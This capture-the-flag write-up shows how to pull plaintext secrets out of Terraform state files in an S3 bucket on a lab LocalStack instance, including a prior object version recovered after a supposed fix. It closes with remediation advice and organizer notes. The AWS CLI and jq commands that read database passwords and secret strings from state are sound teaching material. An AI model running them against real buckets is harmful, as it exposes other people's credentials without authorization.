# Nothing Is Ephemeral

Two flags from one S3 bucket. The first takes reading a Terraform state file;
the second takes knowing what a "fix" does to a versioned object.

`writeup/exploit.sh` performs both and is wired in as the healthcheck. It uses
only the attached access key and the endpoint from the connection info.

## The lesson, up front

Terraform state holds the full value of **every** attribute of every resource —
ones you create, ones you read with `data`, and ones marked `sensitive = true`.
That flag redacts `plan` and `apply` output. It changes nothing about what is
written to the backend. A generated `random_password`, an RDS master password,
a `secret_string` you handed to Secrets Manager: all of it is in the JSON, and
Terraform even records which ones it considers sensitive (`sensitive_attributes`)
right next to the plaintext.

The genuine fix is recent. Terraform 1.10 added `ephemeral` resources and 1.11
added **write-only arguments** — `aws_secretsmanager_secret_version.secret_string_wo`
and friends — which are never persisted to state or plan. Everything before that
is mitigation: lock down the backend, encrypt it, and treat state as a secret.

## Part 1 — the secret they never noticed

```bash
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_DEFAULT_REGION=us-east-1
EP="--endpoint-url http://<team-host>:4566"

aws $EP s3 ls                                     # data-platform-tfstate
aws $EP s3 ls s3://data-platform-tfstate/ --recursive
aws $EP s3 cp s3://data-platform-tfstate/env/prod/terraform.tfstate - | jq '
  .resources[] | .instances[] | .attributes | {password, result, secret_string}'
```

`aws_db_instance.warehouse.password` is flag 1. `random_password.warehouse.result`
holds the same value — Terraform generated it, so it is in state twice. The
ticket was about the signing key; nobody looked at the rest of the file.

## Part 2 — the secret they say is gone

The current state really is clean on that front: `secret_string` is `null`, and
`secret_string_wo_version: 2` shows the migration to the write-only argument.
The team did the right thing to the resource.

They did it by running `terraform apply`, which uploaded a **new** object to a
bucket with versioning on. The previous version is still there.

```bash
aws $EP s3api get-bucket-versioning --bucket data-platform-tfstate   # Enabled
aws $EP s3api list-object-versions --bucket data-platform-tfstate \
  --prefix env/prod/terraform.tfstate \
  --query 'Versions[].{id:VersionId,latest:IsLatest,when:LastModified}'
aws $EP s3api get-object --bucket data-platform-tfstate \
  --key env/prod/terraform.tfstate --version-id <the non-latest id> prior.tfstate
jq '.resources[] | select(.type=="aws_secretsmanager_secret_version")
    | .instances[].attributes.secret_string' prior.tfstate
```

`secret_string` in serial 41 is flag 2.

## What "remediated" should have meant

- Move to write-only arguments (or `ephemeral`), **and**
- rotate the secret — the old value has been readable and must be assumed read,
  **and**
- delete or expire the prior object versions, or accept that the bucket's
  version history is now part of the blast radius.

Versioning on a state bucket is correct — it is the recovery path for a bad
apply. It just means a scrub is not a scrub until the versions go too.

## Notes for the organizer

LocalStack Community does not enforce IAM or credentials, so the "read-only
auditor key" is a story device, not a control. A player who skips the CSV and
uses any credentials gets the same access. That changes nothing about the
solve: both flags still require reading state and then reading a prior version.

Each team gets a separate LocalStack instance for this challenge. Its bucket and
version history are independent of the pipeline challenge's cloud environment.
Both versions are seeded automatically when this challenge instance starts.
